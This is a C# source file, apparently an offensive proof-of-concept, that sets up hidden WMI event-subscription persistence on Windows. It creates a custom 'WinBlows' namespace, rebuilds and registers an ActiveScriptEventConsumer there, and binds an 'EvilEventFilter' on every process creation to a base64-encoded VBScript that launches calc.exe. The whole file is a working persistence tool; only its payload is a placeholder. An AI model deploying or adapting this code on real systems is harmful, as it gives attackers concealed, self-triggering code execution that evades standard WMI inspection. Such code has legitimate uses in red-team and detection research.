using System;
using System.Text;
using System.Management;

namespace WMIPersistence
{
    class Program
    {
        static void Main(string[] args)
        {
            SurreptitiousWMI();
            PersistantWMI();
        }

        static void SurreptitiousWMI()
        {
            try
            {
                // Create namespace named WinBlows
                ManagementObject nameSpace = null;

                ManagementScope rootscope = new ManagementScope(@"root");

                ManagementClass wmiNameSpace = new ManagementClass(rootscope, new ManagementPath("__Namespace"), null);
                nameSpace = wmiNameSpace.CreateInstance();
                nameSpace["Name"] = "WinBlows";
                nameSpace.Put();
                
                Console.WriteLine("[*] Namespace created!");


                // Derive base class
                ManagementClass eventConsumerBase = new ManagementClass("Root\\WinBlows", "__EventConsumer", null);
                ManagementClass newActiveScriptEventConsumer = eventConsumerBase.Derive("ActiveScriptEventConsumer");

                // Add properties to turn base class into facimale of ActiveScriptEventConsumer class
                newActiveScriptEventConsumer.Properties.Add("Name", CimType.String, false);
                newActiveScriptEventConsumer.Properties["Name"].Qualifiers.Add("Key", true, false, true, true, false);
                
                newActiveScriptEventConsumer.Properties.Add("ScriptingEngine", CimType.String, false);
                newActiveScriptEventConsumer.Properties["ScriptingEngine"].Qualifiers.Add("not_null", true, false, false, false, true);
                newActiveScriptEventConsumer.Properties["ScriptingEngine"].Qualifiers.Add("write", true, false, false, false, true);

                newActiveScriptEventConsumer.Properties.Add("ScriptText", CimType.String, false);
                newActiveScriptEventConsumer.Properties["ScriptText"].Qualifiers.Add("write", true, false, false, false, true);

                newActiveScriptEventConsumer.Properties.Add("ScriptFilename", CimType.String, false);
                newActiveScriptEventConsumer.Properties["ScriptFilename"].Qualifiers.Add("write", true, false, false, false, true);

                newActiveScriptEventConsumer.Properties.Add("KillTimeout", CimType.UInt32, false);
                newActiveScriptEventConsumer.Properties["KillTimeout"].Qualifiers.Add("write", true, false, false, false, true);
                newActiveScriptEventConsumer.Put();
                
                Console.WriteLine("[*] ActiveScriptEventConsumer created!");

                // The new class needs to be bound to a provider and registed 
                // First we bind the class to a provider
                ManagementScope scope = new ManagementScope(@"\\.\root\WinBlows");
                ManagementObject newActiveScriptEventConsumerProviderBinding = null;
                ManagementObject eventConsumerProviderRegistration = null;

                newActiveScriptEventConsumerProviderBinding = new ManagementClass(scope, new ManagementPath("__Win32Provider"), null).CreateInstance();
                
                newActiveScriptEventConsumerProviderBinding["Name"] = "ActiveScriptEventConsumer";
                newActiveScriptEventConsumerProviderBinding["Clsid"] = "{266c72e7-62e8-11d1-ad89-00c04fd8fdff}";
                newActiveScriptEventConsumerProviderBinding["PerUserInitialization"] = true;
                newActiveScriptEventConsumerProviderBinding["HostingModel"] = "SelfHost";
                newActiveScriptEventConsumerProviderBinding.Put();
                
                Console.WriteLine("[*] New provider binding creatd!");

                // Then we register the binding
                string[] className = { "ActiveScriptEventConsumer" };
                eventConsumerProviderRegistration = new ManagementClass(scope, new ManagementPath("__EventConsumerProviderRegistration"), null).CreateInstance();
                
                eventConsumerProviderRegistration["provider"] = newActiveScriptEventConsumerProviderBinding;
                eventConsumerProviderRegistration["ConsumerClassNames"] = className;
                eventConsumerProviderRegistration.Put();

                Console.WriteLine("[*] Consumer registered with provider!");
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            } // END CATCH
        } // END SurreptitiousWMI FUNC

        static void PersistantWMI()
        {
            ManagementObject eventFilter = null;
            ManagementObject eventConsumer = null;
            ManagementObject evtToConsBinder = null;

            string vbscript64 = "RGltIHNobA0KU2V0IHNobCA9IENyZWF0ZU9iamVjdCgiV3NjcmlwdC5TaGVsbCIpDQpDYWxsIHNobC5SdW4oIiIiY2FsYy5leGUiIiIpDQpTZXQgc2hsID0gTm90aGluZw0KV1NjcmlwdC5RdWl0";
            string vbscript = Encoding.UTF8.GetString(Convert.FromBase64String(vbscript64));
            try
            {
                ManagementScope scope = new ManagementScope(@"\\.\root\WinBlows");
                
                ManagementClass wmiEventFilter = new ManagementClass(scope, new ManagementPath("__EventFilter"), null);
                String strQuery = @"SELECT * FROM __InstanceCreationEvent WITHIN 5 " +
                    "WHERE TargetInstance ISA \"Win32_Process\"";

                WqlEventQuery eventQuery = new WqlEventQuery(strQuery);
                eventFilter = wmiEventFilter.CreateInstance();
                eventFilter["Name"] = "EvilEventFilter";
                eventFilter["Query"] = eventQuery.QueryString;
                eventFilter["QueryLanguage"] = eventQuery.QueryLanguage;
                eventFilter["EventNameSpace"] = @"root\cimv2";
                eventFilter.Put();
                Console.WriteLine("[*] Event filter created!");

                eventConsumer = new ManagementClass(scope, new ManagementPath("ActiveScriptEventConsumer"), null).CreateInstance();
                eventConsumer["Name"] = "EvilActiveScriptEventConsumer";
                eventConsumer["ScriptingEngine"] = "VBScript";
                eventConsumer["ScriptText"] = vbscript;
                eventConsumer.Put();

                Console.WriteLine("[*] Event consumer created!");

                evtToConsBinder = new ManagementClass(scope, new ManagementPath("__FilterToConsumerBinding"), null).CreateInstance();
                evtToConsBinder["Filter"] = eventFilter.Path.RelativePath;
                evtToConsBinder["Consumer"] = eventConsumer.Path.RelativePath;
                evtToConsBinder.Put();

                Console.WriteLine("[*] Filter to consumer binding created!");
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            } // END CATCH
        } // END PERSISTANCE FUNC

    } // END CLASS
} // END NAMESPACE